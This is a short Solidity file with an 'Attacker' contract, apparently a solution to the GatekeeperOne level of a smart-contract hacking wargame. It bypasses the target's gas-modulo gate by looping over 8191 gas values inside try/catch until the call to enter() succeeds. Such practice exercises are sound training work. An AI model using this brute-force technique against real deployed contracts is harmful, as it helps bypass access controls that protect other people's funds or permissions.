// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./Contract.sol";

contract Attacker {
    GatekeeperOne gatekeeper;

    constructor(GatekeeperOne _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function attack(bytes8 _gateKey) public {
        //require(gasleft() % 8191 == 0) must be passed, do a count down and try all values in that range.
        for (uint i = 0; i < 8191; i++) {
            try gatekeeper.enter{gas: 800000 + i}(_gateKey) {
                break;
            } catch {}
        }
    }
}
